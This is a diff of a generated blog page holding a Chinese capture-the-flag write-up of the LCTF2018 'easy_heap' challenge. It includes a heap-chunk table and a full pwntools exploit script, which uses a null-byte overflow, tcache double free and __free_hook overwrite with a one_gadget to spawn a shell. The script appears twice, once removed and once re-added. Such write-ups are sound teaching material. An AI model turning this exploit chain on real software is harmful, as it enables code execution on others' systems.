 <p>接下来申请第一次释放的<code>0x560d334f0a00</code>即tcache2，现在tcache中只剩余free_hook，然后再次申请就申请出了free_hook,并向其中写入one_gadget</p>
@@ -532,44 +554,46 @@
 <table>
 <thead>
 <tr>
-<th align="center"><strong>chunk0</strong></th>
-<th align="center"><strong>chunk1</strong></th>
-<th align="center"><strong>chunk2</strong></th>
-<th align="center"><strong>chunk3</strong></th>
+<th style="text-align:center"><strong>chunk0</strong></th>
+<th style="text-align:center"><strong>chunk1</strong></th>
+<th style="text-align:center"><strong>chunk2</strong></th>
+<th style="text-align:center"><strong>chunk3</strong></th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center"><strong>0x560d334f0a00</strong></td>
-<td align="center"><strong>0x560d334f0a00</strong></td>
-<td align="center"><strong>0x560d334f0400</strong></td>
-<td align="center"><strong>0x560d334f0500</strong></td>
+<tbody>
+<tr>
+<td style="text-align:center"><strong>0x560d334f0a00</strong></td>
+<td style="text-align:center"><strong>0x560d334f0a00</strong></td>
+<td style="text-align:center"><strong>0x560d334f0400</strong></td>
+<td style="text-align:center"><strong>0x560d334f0500</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk4</strong></td>
-<td align="center"><strong>chunk5</strong></td>
-<td align="center"><strong>chunk6</strong></td>
-<td align="center"><strong>chunk7</strong></td>
+<td style="text-align:center"><strong>chunk4</strong></td>
+<td style="text-align:center"><strong>chunk5</strong></td>
+<td style="text-align:center"><strong>chunk6</strong></td>
+<td style="text-align:center"><strong>chunk7</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>0x560d334f0600</strong></td>
-<td align="center"><strong>0x560d334f0700</strong></td>
-<td align="center"><strong>0x560d334f0800</strong></td>
-<td align="center"><strong>0x560d334f0c00</strong></td>
+<td style="text-align:center"><strong>0x560d334f0600</strong></td>
+<td style="text-align:center"><strong>0x560d334f0700</strong></td>
+<td style="text-align:center"><strong>0x560d334f0800</strong></td>
+<td style="text-align:center"><strong>0x560d334f0c00</strong></td>
 </tr>
 <tr>
-<td align="center"><strong>chunk8</strong></td>
-<td align="center"><strong>chunk9</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>chunk8</strong></td>
+<td style="text-align:center"><strong>chunk9</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
 <tr>
-<td align="center"><strong>0x560d334f0900</strong></td>
-<td align="center"><strong>free_hook(one_gadget)</strong></td>
-<td align="center"></td>
-<td align="center"></td>
+<td style="text-align:center"><strong>0x560d334f0900</strong></td>
+<td style="text-align:center"><strong>free_hook(one_gadget)</strong></td>
+<td style="text-align:center"></td>
+<td style="text-align:center"></td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>接下来delete(0)即可getshell</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./easy_heap&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./easy_heap&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#chunk 6</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#chunk 7</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;dddd&#x27;</span>)<span class="comment">#chunk 8</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;eeee&#x27;</span>)<span class="comment">#chunk 9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>): <span class="comment">#删除chunk0-chunk5</span></span><br><span class="line">     dele(i)</span><br><span class="line">dele(<span class="number">9</span>)            <span class="comment">#先删除chunk9 防止chunk6-chunk8与top chunk合并</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,<span class="number">9</span>):  <span class="comment">#修改pre_size</span></span><br><span class="line">     dele(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">     add(<span class="number">0x90</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#清空tcache </span></span><br><span class="line"><span class="comment">#分割合并块，保留prev size</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#chunk 7</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#chunk 8</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;dddd&#x27;</span>)<span class="comment">#chunk 9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">      dele(i)  <span class="comment">#填充tcache </span></span><br><span class="line">dele(<span class="number">8</span>)        <span class="comment"># 填满tcache，防止后续释放进unsorted bin中的chunk与top chunk合并</span></span><br><span class="line">dele(<span class="number">7</span>)        <span class="comment">#获得fd指针与bk指针，为后续目标目标堆块的fd和bk指针指向unsorted bin做准备</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;cccc&#x27;</span>) <span class="comment">#申请上次释放的chunk8 null-byte-overflow漏洞覆盖chunk 9 inuse标志位 此时为chunk0</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)        <span class="comment"># 填满tcache 使得free chunk9为unsorted bin</span></span><br><span class="line">dele(<span class="number">9</span>)        <span class="comment"># 合并chunk7 ,chunk 0,chunk 9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">      add(<span class="number">0x90</span>,<span class="string">&#x27;aaaa&#x27;</span>)  <span class="comment">#分配完tcache ，使得下次分配从unsorted bin 中分配 chunk1-chunk7</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;cccc&#x27;</span>)        <span class="comment">#切割 unsorted bin   chunk8</span></span><br><span class="line">show(<span class="number">0</span>)                 <span class="comment">#泄漏基址</span></span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_leak: &#x27;</span>,<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">libc_base=libc_leak-<span class="number">0x3EBCa0</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;dddd&#x27;</span>)        <span class="comment">#再次切割unsorted chunk ，使得chunk0和chunk9都存放目标堆块 </span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">9</span>)  <span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0x10</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;eeee&#x27;</span>)</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f302</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;one_gadget: &quot;</span>,<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">add(<span class="number">0x10</span>,p64(one_gadget))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>
-
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">chuwei</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/08/06/LCTF2018%20PWN%20easy_heap/">http://example.com/2022/08/06/LCTF2018%20PWN%20easy_heap/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">chuwei'blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/tcache/">tcache</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/08/06/libc-2.26/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">libc 2.26</div></div></a></div><div class="next-post pull-right"><a href="/2022/08/06/large%20bin%20attack/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">large bin attack</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%A3%80%E6%9F%A5"><span class="toc-number">1.</span> <span class="toc-text">保护检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">IDA分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">main函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#add%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">add函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sub-BBF-%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.</span> <span class="toc-text">sub_BBF()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#del-%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.</span> <span class="toc-text">del()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#show-%E5%87%BD%E6%95%B0"><span class="toc-number">2.5.</span> <span class="toc-text">show()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E5%88%A9%E7%94%A8%E5%A0%86%E5%9D%97%E5%90%88%E5%B9%B6%E6%94%B9%E5%86%99pre-size"><span class="toc-number">3.1.</span> <span class="toc-text">首先利用堆块合并改写pre_size</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#null-byte-overflow%E6%BC%8F%E6%B4%9E%E8%A6%86%E7%9B%96inuse%E6%A0%87%E5%BF%97%E4%BD%8D"><span class="toc-number">3.2.</span> <span class="toc-text">null-byte-overflow漏洞覆盖inuse标志位</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2unsorted-bin%E5%9C%B0%E5%9D%80"><span class="toc-number">3.3.</span> <span class="toc-text">泄露unsorted bin地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E5%BB%BADouble-Free%EF%BC%8C%E5%B0%86free-hook%E6%8C%82%E8%BF%9Btcache-bin"><span class="toc-number">3.4.</span> <span class="toc-text">构建Double Free，将free_hook挂进tcache bin</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By chuwei</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+<h3 id="exp">exp</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./easy_heap&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./easy_heap&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#chunk 6</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#chunk 7</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;dddd&#x27;</span>)<span class="comment">#chunk 8</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;eeee&#x27;</span>)<span class="comment">#chunk 9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>): <span class="comment">#删除chunk0-chunk5</span></span><br><span class="line">     dele(i)</span><br><span class="line">dele(<span class="number">9</span>)            <span class="comment">#先删除chunk9 防止chunk6-chunk8与top chunk合并</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,<span class="number">9</span>):  <span class="comment">#修改pre_size</span></span><br><span class="line">     dele(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">     add(<span class="number">0x90</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#清空tcache </span></span><br><span class="line"><span class="comment">#分割合并块，保留prev size</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#chunk 7</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#chunk 8</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;dddd&#x27;</span>)<span class="comment">#chunk 9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">      dele(i)  <span class="comment">#填充tcache </span></span><br><span class="line">dele(<span class="number">8</span>)        <span class="comment"># 填满tcache，防止后续释放进unsorted bin中的chunk与top chunk合并</span></span><br><span class="line">dele(<span class="number">7</span>)        <span class="comment">#获得fd指针与bk指针，为后续目标目标堆块的fd和bk指针指向unsorted bin做准备</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">&#x27;cccc&#x27;</span>) <span class="comment">#申请上次释放的chunk8 null-byte-overflow漏洞覆盖chunk 9 inuse标志位 此时为chunk0</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)        <span class="comment"># 填满tcache 使得free chunk9为unsorted bin</span></span><br><span class="line">dele(<span class="number">9</span>)        <span class="comment"># 合并chunk7 ,chunk 0,chunk 9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">      add(<span class="number">0x90</span>,<span class="string">&#x27;aaaa&#x27;</span>)  <span class="comment">#分配完tcache ，使得下次分配从unsorted bin 中分配 chunk1-chunk7</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;cccc&#x27;</span>)        <span class="comment">#切割 unsorted bin   chunk8</span></span><br><span class="line">show(<span class="number">0</span>)                 <span class="comment">#泄漏基址</span></span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_leak: &#x27;</span>,<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">libc_base=libc_leak-<span class="number">0x3EBCa0</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;dddd&#x27;</span>)        <span class="comment">#再次切割unsorted chunk ，使得chunk0和chunk9都存放目标堆块 </span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">9</span>)  <span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0x10</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;eeee&#x27;</span>)</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f302</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;one_gadget: &quot;</span>,<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">add(<span class="number">0x10</span>,p64(one_gadget))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">chuwei</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/08/06/LCTF2018%20PWN%20easy_heap/">http://example.com/2022/08/06/LCTF2018%20PWN%20easy_heap/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">chuwei'blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/tcache/">tcache</a></div><div class="post_share"><div class="social-share" data-image="/img/973119.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/08/06/libc-2.26/"><img class="prev-cover" src="/img/973119.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">libc 2.26</div></div></a></div><div class="next-post pull-right"><a href="/2022/08/06/large%20bin%20attack/"><img class="next-cover" src="/img/973119.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">large bin attack</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%A3%80%E6%9F%A5"><span class="toc-number">1.</span> <span class="toc-text">保护检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">IDA分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">main函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#add%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">add函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sub-BBF-%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.</span> <span class="toc-text">sub_BBF()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#del-%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.</span> <span class="toc-text">del()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#show-%E5%87%BD%E6%95%B0"><span class="toc-number">2.5.</span> <span class="toc-text">show()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 